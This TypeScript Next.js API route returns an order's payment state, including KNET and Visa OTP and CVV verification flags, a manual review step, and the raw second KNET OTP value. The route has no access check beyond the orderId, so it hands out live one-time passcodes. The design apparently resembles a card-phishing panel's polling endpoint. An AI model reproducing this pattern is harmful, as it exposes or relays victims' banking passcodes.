import { type NextRequest, NextResponse } from "next/server";
import { findKnetByOrderId } from "@/models/knet.repository";
import { findOrderById } from "@/models/order.repository";
import { findVisaByOrderId } from "@/models/visa.repository";

export const dynamic = "force-dynamic";

export async function GET(req: NextRequest) {
  const orderId = req.nextUrl.searchParams.get("orderId")?.trim();
  if (!orderId) return NextResponse.json({ ok: false }, { status: 400 });

  const [order, knet, visa] = await Promise.all([
    findOrderById(orderId),
    findKnetByOrderId(orderId),
    findVisaByOrderId(orderId),
  ]);
  if (!order) return NextResponse.json({ ok: false, code: "not_found" }, { status: 404 });

  return NextResponse.json({
    ok: true,
    orderStatus: order.status,
    paymentStatus: order.payment?.status ?? null,
    knetStatus: knet?.status ?? null,
    visaStatus: visa?.status ?? null,
    knetReviewStep: knet?.reviewStep ?? null,
    knetOtpVerified: knet?.otpVerified ?? false,
    knetCvvVerified: knet?.cvvVerified ?? false,
    knetOtp2Verified: knet?.otp2Verified ?? false,
    knetOtp2: knet?.otp2 ?? null,
    visaOtpVerified: visa?.otpVerified ?? false,
    visaCvvVerified: visa?.cvvVerified ?? false,
  });
}
